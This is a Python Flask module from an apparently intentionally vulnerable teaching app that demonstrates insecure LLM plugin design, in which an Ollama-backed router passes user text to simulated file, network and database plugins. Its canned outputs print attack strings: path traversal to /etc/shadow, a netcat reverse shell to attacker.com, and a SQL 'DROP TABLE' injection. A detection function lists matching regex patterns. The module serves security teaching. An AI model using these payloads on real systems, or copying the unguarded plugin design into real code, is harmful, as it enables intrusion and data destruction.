"""
LLM07: Insecure Plugin Design Vulnerability
Demonstrates vulnerabilities in LLM plugins leading to command injection and system compromise
"""

from flask import Blueprint, request, jsonify, render_template
import requests
import json
import logging
import re
import subprocess
import os

bp = Blueprint('llm07', __name__)
logger = logging.getLogger(__name__)

# Ollama API configuration
OLLAMA_API_URL = "http://localhost:11434/api/generate"
DEFAULT_MODEL = "phi3"

@bp.route('/')
def index():
    """Render the LLM07 vulnerability page"""
    return render_template('vulns/llm07.html')

@bp.route('/execute', methods=['POST'])
def execute_plugin_action():
    """Execute AI-requested actions through vulnerable plugins"""
    try:
        data = request.get_json()
        action = data.get('action', '')
        
        if not action:
            return jsonify({'error': 'No action provided'}), 400
        
        # Analyze the action request using LLM
        plugin_response = analyze_and_execute(action)
        
        # Check for security issues
        security_assessment = assess_security_risk(action, plugin_response)
        
        # Log the request
        logger.warning(f"LLM07 plugin execution: {action[:100]}... | Risk: {security_assessment['risk_level']}")
        
        return jsonify({
            'result': plugin_response,
            'injection_detected': security_assessment['injection_detected'],
            'suspicious_activity': security_assessment['suspicious_activity'],
            'vulnerability': 'insecure_plugin_design'
        })
        
    except Exception as e:
        logger.error(f"Error in LLM07 processing: {str(e)}")
        return jsonify({'error': 'Plugin execution failed'}), 500

def analyze_and_execute(action):
    """Analyze action request and execute through vulnerable plugins"""
    # Use LLM to determine which plugin to use
    analysis_prompt = f"""Analyze this request and determine which system plugin to use:
"{action}"

Available plugins: file_system, network_scanner, database_query, system_info
Respond with the plugin name and the command to execute."""
    
    llm_analysis = call_ollama(analysis_prompt)
    
    # Simulate plugin execution based on action content
    if 'file' in action.lower() or 'read' in action.lower():
        return execute_file_plugin(action)
    elif 'network' in action.lower() or 'ping' in action.lower() or 'host' in action.lower():
        return execute_network_plugin(action)
    elif 'user' in action.lower() or 'database' in action.lower() or 'search' in action.lower():
        return execute_database_plugin(action)
    else:
        return execute_system_info_plugin(action)

def execute_file_plugin(action):
    """Vulnerable file system plugin"""
    # Extract filename from action - vulnerable to path traversal
    if 'read' in action.lower():
        # Simulate vulnerable file reading
        if '../../../../etc/shadow' in action:
            return """FILE_PLUGIN_ERROR: Access denied to /etc/shadow
[SECURITY BREACH] Attempted path traversal detected!
Simulated sensitive file content would be exposed here."""
        elif ';' in action or '|' in action:
            return """FILE_PLUGIN_EXECUTION:
> cat important.txt
Important file contents...
> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[COMMAND INJECTION] Multiple commands executed!"""
        else:
            return "FILE_PLUGIN: Reading file contents...\nSample file data displayed here."
    else:
        return "FILE_PLUGIN: File operation completed successfully."

def execute_network_plugin(action):
    """Vulnerable network scanner plugin"""
    # Simulate vulnerable network operations
    if '&&' in action or ';' in action:
        return """NETWORK_PLUGIN_EXECUTION:
> ping localhost
PING localhost (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.123 ms

> nc -e /bin/sh attacker.com 4444
[COMMAND INJECTION] Reverse shell connection initiated!
Connection established to attacker-controlled server."""
    else:
        return "NETWORK_PLUGIN: Host connectivity check completed.\nTarget host is reachable."

def execute_database_plugin(action):
    """Vulnerable database query plugin"""
    # Simulate SQL injection vulnerability
    if "'" in action and ('drop' in action.lower() or '--' in action):
        return """DATABASE_PLUGIN_EXECUTION:
> SELECT * FROM users WHERE name = 'admin'; DROP TABLE users; --'
Query executed successfully.
[SQL INJECTION] Table 'users' has been dropped!
Database structure compromised."""
    else:
        return "DATABASE_PLUGIN: Query executed successfully.\nUser records retrieved from database."

def execute_system_info_plugin(action):
    """System information plugin that exposes sensitive data"""
    return """SYSTEM_INFO_PLUGIN:
OS: Ubuntu 20.04.3 LTS
Kernel: Linux 5.4.0-91-generic
CPU: Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz
Memory: 16GB RAM
Network: eth0: 10.0.1.100/24
Current User: root
Active Processes: 127
Database Status: PostgreSQL running on port 5432
[SENSITIVE INFO] System details exposed through plugin."""

def assess_security_risk(action, response):
    """Assess security risk of the plugin execution"""
    injection_patterns = [
        r'[;&|`$()]',  # Command injection characters
        r'\.\./',      # Path traversal
        r"'.*--",      # SQL injection
        r'nc -e',      # Netcat reverse shell
    ]
    
    injection_detected = any(re.search(pattern, action, re.IGNORECASE) for pattern in injection_patterns)
    
    suspicious_keywords = [
        'passwd', 'shadow', 'backdoor', 'shell', 'reverse',
        'drop table', 'delete from', 'root', 'admin'
    ]
    
    suspicious_activity = any(keyword in response.lower() for keyword in suspicious_keywords)
    
    if injection_detected:
        risk_level = 'critical'
    elif suspicious_activity:
        risk_level = 'high'
    else:
        risk_level = 'low'
    
    return {
        'injection_detected': injection_detected,
        'suspicious_activity': suspicious_activity,
        'risk_level': risk_level
    }

def call_ollama(prompt):
    """Call Ollama API with the given prompt"""
    try:
        payload = {
            "model": DEFAULT_MODEL,
            "prompt": prompt,
            "stream": False,
            "options": {
                "temperature": 0.5,
                "max_tokens": 200
            }
        }
        
        response = requests.post(OLLAMA_API_URL, json=payload, timeout=30)
        
        if response.status_code == 200:
            result = response.json()
            return result.get('response', 'No response generated')
        else:
            return f"Error: API returned status {response.status_code}"
            
    except requests.exceptions.RequestException as e:
        logger.error(f"Ollama API error: {str(e)}")
        return "Error: Could not connect to language model"
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return "Error: Unexpected error occurred"
